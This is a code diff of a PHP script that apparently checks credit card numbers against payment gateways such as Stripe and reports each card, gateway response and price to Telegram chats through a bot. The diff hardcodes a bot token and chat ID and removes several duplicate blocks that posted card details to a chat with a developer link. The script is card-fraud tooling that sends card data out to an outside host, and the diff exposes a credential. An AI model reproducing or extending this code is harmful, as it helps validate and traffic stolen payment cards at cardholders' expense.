@@ -166,10 +166,7 @@ if ($endPos === false) {
 return substr($content, $startPos, $endPos - $startPos);
 }
 function output($method, $data) {
-    $bot_token = getenv('BOT_TOKEN');
-    if (empty($bot_token)) {
-        return ['ok' => false, 'description' => 'BOT_TOKEN not set'];
-    }
+    $bot_token = '7887607656:AAHRcgkWBxEB9kUnqRfNqtu4d6OtDf7Er2s';
     $out = curl_init();
 
     curl_setopt_array($out, [
@@ -1665,7 +1662,7 @@ Price: $totalamt
             ]
         ])
     ];
-    $chat_id1 = getenv('CHAT_ID') ?: '';
+    $chat_id1 = '-1003238480673';
     output('sendVideo', array_merge([
         'chat_id' => $chat_id1,
         'video' => 'https://t.me/amanpan/1'
@@ -1681,28 +1678,6 @@ Price: $totalamt
         'Gateway' => $gateway,
         'cc' => $cc1,
     ]);
-    $kb_s = [
-        'caption' => "
-Card: $cc1
-Response: $err
-Gateway: $gateway
-Price: $totalamt
-        ",
-        'reply_markup' => json_encode([
-            'inline_keyboard' => [
-                [
-                    [
-                        'text' => "Dev",
-                        'url' => 'https://t.me/amanpandey1212'
-                    ]
-                ]
-            ]
-        ])
-    ];
-    output('sendVideo', array_merge([
-        'chat_id' => getenv('CHAT_ID') ?: '',
-        'video' => 'https://t.me/amanpan/1'
-    ], $kb_s));
     echo $result;
     exit;
 } elseif (strpos($response5, '/stripe/authentications/')) {
@@ -1714,28 +1689,6 @@ Price: $totalamt
         'Gateway' => $gateway,
         'cc' => $cc1,
     ]);
-    $kb_s = [
-        'caption' => "
-Card: $cc1
-Response: $err
-Gateway: $gateway
-Price: $totalamt
-        ",
-        'reply_markup' => json_encode([
-            'inline_keyboard' => [
-                [
-                    [
-                        'text' => "Dev",
-                        'url' => 'https://t.me/amanpandey1212'
-                    ]
-                ]
-            ]
-        ])
-    ];
-    output('sendVideo', array_merge([
-        'chat_id' => getenv('CHAT_ID') ?: '',
-        'video' => 'https://t.me/amanpan/5'
-    ], $kb_s));
     echo $result;
     exit;
 }
@@ -1763,28 +1716,6 @@ Price: $totalamt
         'Gateway' => $gateway,
         'cc' => $cc1,
     ]);
-    $kb_s = [
-        'caption' => "
-Card: $cc1
-Response: $err
-Gateway: $gateway
-Price: $totalamt
-        ",
-        'reply_markup' => json_encode([
-            'inline_keyboard' => [
-                [
-                    [
-                        'text' => "Dev",
-                        'url' => 'https://t.me/amanpandey1212'
-                    ]
-                ]
-            ]
-        ])
-    ];
-    output('sendVideo', array_merge([
-        'chat_id' => getenv('CHAT_ID') ?: '',
-        'video' => 'https://t.me/amanpan/1'
-    ], $kb_s));
     echo $result;
     echo $response5;
     exit;
